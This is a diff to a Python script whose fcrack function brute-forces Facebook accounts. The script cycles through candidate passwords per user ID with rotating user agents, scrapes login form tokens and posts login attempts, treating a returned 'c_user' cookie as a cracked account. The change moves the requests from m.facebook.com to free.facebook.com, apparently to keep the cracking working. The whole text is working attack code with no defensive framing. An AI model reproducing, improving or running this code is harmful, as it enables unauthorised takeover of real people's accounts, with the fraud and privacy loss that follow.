@@ -1456,7 +1456,7 @@ def fcrack(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            free_fb = session.get('https://m.facebook.com').text
+            free_fb = session.get('https://free.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -1500,7 +1500,7 @@ def fcrack(uid,pwx,tl):
             'upgrade-insecure-requests': '1',
 
             'user-agent': pro}
-            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc',data=log_data,headers=header_freefb).text
+            lo = session.post('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',cookies=cookies,headers=headers).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
             if 'c_user' in log_cookies:
